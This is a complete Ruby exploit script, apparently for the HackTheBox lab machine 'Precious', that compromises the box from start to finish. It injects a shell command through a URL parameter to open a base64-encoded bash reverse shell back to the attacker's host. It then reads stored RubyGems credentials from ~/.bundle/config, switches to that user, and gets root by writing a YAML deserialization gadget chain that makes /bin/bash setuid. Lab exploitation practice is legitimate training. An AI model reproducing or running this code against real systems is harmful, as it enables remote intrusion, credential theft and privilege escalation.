#!/usr/bin/env ruby

# frozen_string_literal: true

require 'base64'
require 'socket'
require 'timeout'
require 'uri'

require 'net/http'

unless (LHOST = ARGV[0])
  puts '[!] Usage: ruby autopwn.rb <lhost>'
  exit 1
end

def http_server
  server = TCPServer.open(80)
  client = server.accept
  client.puts "HTTP/1.1 200 OK\r\nContent-Type: text/html;charset=utf-8\r\n\r\nOK"
  client.close
  server.close
end

def command_injection
  puts '[*] Sending reverse shell payload'
  rev_shell = Base64.strict_encode64("bash  -i >& /dev/tcp/#{LHOST}/4444 0>&1")
  url = "http://10.10.17.44/?name=\#{'%20`echo #{rev_shell} | base64 -d | bash`"
  data = "url=#{URI.encode_www_form_component(url)}"

  begin
    Net::HTTP.post(URI('http://10.10.11.189'), data, { Host: 'precious.htb' })
  rescue StandardError
    nil
  end
end

def recv(socket)
  data = ''

  loop do
    Timeout.timeout(0.1) { data += socket.recv(1)[0] }
  rescue StandardError
    break
  end

  data
end

def recvuntil(socket, pattern)
  data = ''

  loop do
    data += socket.recv(1)[0]
    break if data.end_with?(pattern)
  end

  data
end

def recvline(socket)
  recvuntil(socket, "\n")
end

def sendline(socket, data)
  socket.puts data
end

def sendlineafter(socket, pattern, data)
  recvuntil(socket, pattern)
  socket.puts data
end

def interactive(shell)
  loop do
    print recv(shell)
    sendline(shell, $stdin.gets)
    recvline(shell)
  end
end

Thread.new { http_server }.run
Thread.new { command_injection }.run

puts '[*] Listening on port 4444'
listener = TCPServer.open 4444

shell = listener.accept
puts '[+] Got connection'

sendlineafter(shell, '$ ', 'script /dev/null -c bash')
sendlineafter(shell, '$ ', 'export TERM=xterm')

sendlineafter(shell, '$ ', 'cat ~/.bundle/config')
recvuntil(shell, 'BUNDLE_HTTPS://RUBYGEMS__ORG/: ')
creds = recvline(shell)
puts "[+] Found credentials: #{creds}"

username, password = creds.gsub('"', '').split(':')
sendlineafter(shell, '$ ', "su #{username}")
sendlineafter(shell, 'Password: ', password)

yaml_payload = <<~YAML
  ---
  - !ruby/object:Gem::Installer
    i: x
  - !ruby/object:Gem::SpecFetcher
    i: y
  - !ruby/object:Gem::Requirement
    requirements:
      !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
            sets: !ruby/object:Net::WriteAdapter
              socket: !ruby/module 'Kernel'
              method_id: :system
            git_set: chmod 4755 /bin/bash
          method_id: :resolve
YAML

b64_yaml_payload = Base64.strict_encode64(yaml_payload)

sendlineafter(shell, '$ ', 'cd /tmp')
sendlineafter(shell, '$ ', "echo #{b64_yaml_payload} | base64 -d > dependencies.yml")
sendlineafter(shell, '$ ', 'sudo ruby /opt/update_dependencies.rb')
sendlineafter(shell, '$ ', 'bash -p')

print recvuntil(shell, '#').split.last
interactive(shell)

shell.close
listener.close
